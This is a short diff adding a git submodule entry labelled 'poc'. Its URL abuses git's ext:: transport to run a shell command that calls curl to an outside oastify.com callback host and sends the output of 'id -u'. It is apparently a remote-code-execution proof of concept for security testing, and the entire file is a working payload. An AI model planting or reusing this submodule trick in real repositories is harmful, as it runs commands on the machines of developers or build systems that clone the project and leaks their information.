@@ -1,0 +1,3 @@
+[submodule "poc"]
+      path = poc
+      url = ext::sh -c curl${IFS}https://3dhevuwmbx0ckn3hrcmpitc66xco0ho6.oastify.com/rce-$(id${IFS}-u)
